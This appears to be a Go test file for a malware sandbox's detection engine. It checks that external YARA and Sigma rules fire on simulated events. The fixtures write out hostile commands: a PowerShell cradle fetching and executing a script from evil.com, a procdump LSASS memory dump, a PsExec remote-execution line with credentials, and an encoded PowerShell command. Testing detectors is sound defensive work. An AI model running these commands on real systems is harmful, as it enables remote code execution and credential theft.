package rules_test

// external_rules_test.go — verifies that .yar and .yml files dropped in the
// rules/ directory at the workspace root are loaded and produce hits.

import (
	"testing"
	"time"

	"github.com/lemas-sandbox/lemas/pkg/monitor"
	"github.com/lemas-sandbox/lemas/pkg/rules"
)

const rulesDir = "../../rules" // relative to pkg/rules/

func TestExternalYaraRuleAgentTesla(t *testing.T) {
	scanner, err := rules.NewYaraScanner(rulesDir)
	if err != nil {
		t.Fatalf("NewYaraScanner: %v", err)
	}

	// Simulate Agent Tesla memory dump containing its characteristic strings
	content := []byte("smtp.gmail.com GetAsyncKeyState stolen credentials")

	hits := scanner.ScanMemory(1234, "0x00400000", content)
	found := false
	for _, h := range hits {
		if h.RuleName == "DetectAgentTesla" {
			found = true
			if h.MITRETTP != "T1056.001" {
				t.Errorf("expected T1056.001, got %s", h.MITRETTP)
			}
		}
	}
	if !found {
		t.Error("expected DetectAgentTesla hit from external .yar rule")
	}
}

func TestExternalYaraRuleRemcosRAT(t *testing.T) {
	scanner, _ := rules.NewYaraScanner(rulesDir)

	content := []byte("REMCOS_PERS registry key for persistence")
	hits := scanner.ScanScript(content, "test:remcos")

	found := false
	for _, h := range hits {
		if h.RuleName == "DetectRemcosRAT" {
			found = true
		}
	}
	if !found {
		t.Error("expected DetectRemcosRAT hit from external .yar rule")
	}
}

func TestExternalYaraRuleBase64PS(t *testing.T) {
	scanner, _ := rules.NewYaraScanner(rulesDir)

	content := []byte(`powershell -EncodedCommand SQBFAFgA`)
	hits := scanner.ScanScript(content, "test:b64ps")

	found := false
	for _, h := range hits {
		if h.RuleName == "SuspiciousBase64PowerShellDrop" {
			found = true
		}
	}
	if !found {
		t.Error("expected SuspiciousBase64PowerShellDrop from external .yar rule")
	}
}

func TestExternalSigmaDownloadCradle(t *testing.T) {
	corr, err := rules.NewSigmaCorrelatorWithDir(rulesDir)
	if err != nil {
		t.Fatalf("NewSigmaCorrelatorWithDir: %v", err)
	}

	ev := monitor.Event{
		JobID:     "ext-test",
		Timestamp: time.Now(),
		EventType: monitor.EventPowerShell,
		PID:       1111,
		Category:  monitor.CatScript,
		Data: map[string]interface{}{
			"script_block": `(New-Object Net.WebClient).DownloadString("http://evil.com/p.ps1") | IEX`,
		},
	}

	hits := corr.Evaluate(ev)
	found := false
	for _, h := range hits {
		if h.RuleName == "PowerShell Suspicious Download Cradle" {
			found = true
			if h.MITRETTP != "T1105" {
				t.Errorf("expected T1105, got %s", h.MITRETTP)
			}
		}
	}
	if !found {
		t.Error("expected 'PowerShell Suspicious Download Cradle' hit from external .yml Sigma rule")
	}
}

func TestExternalSigmaLSASSRead(t *testing.T) {
	corr, _ := rules.NewSigmaCorrelatorWithDir(rulesDir)

	ev := monitor.Event{
		JobID:     "ext-test",
		Timestamp: time.Now(),
		EventType: monitor.EventProcessCreate,
		PID:       2222,
		Category:  monitor.CatProcess,
		Data: map[string]interface{}{
			"cmdline":    "procdump.exe -ma lsass.exe lsass.dmp",
			"image_path": `C:\Tools\procdump.exe`,
		},
	}

	hits := corr.Evaluate(ev)
	found := false
	for _, h := range hits {
		if h.RuleName == "LSASS Memory Read via ProcDump or Task Manager" {
			found = true
			if h.MITRETTP != "T1003.001" {
				t.Errorf("expected T1003.001, got %s", h.MITRETTP)
			}
		}
	}
	if !found {
		t.Error("expected 'LSASS Memory Read via ProcDump or Task Manager' from external .yml Sigma rule")
	}
}

func TestExternalSigmaPsExec(t *testing.T) {
	corr, _ := rules.NewSigmaCorrelatorWithDir(rulesDir)

	ev := monitor.Event{
		JobID:     "ext-test",
		Timestamp: time.Now(),
		EventType: monitor.EventProcessCreate,
		PID:       3333,
		Category:  monitor.CatProcess,
		Data: map[string]interface{}{
			"cmdline":    `psexec \\192.168.1.5 -u admin -p pass cmd.exe`,
			"image_path": `C:\Tools\PsExec.exe`,
		},
	}

	hits := corr.Evaluate(ev)
	found := false
	for _, h := range hits {
		if h.RuleName == "PsExec Remote Execution" {
			found = true
		}
	}
	if !found {
		t.Error("expected 'PsExec Remote Execution' from external .yml Sigma rule")
	}
}
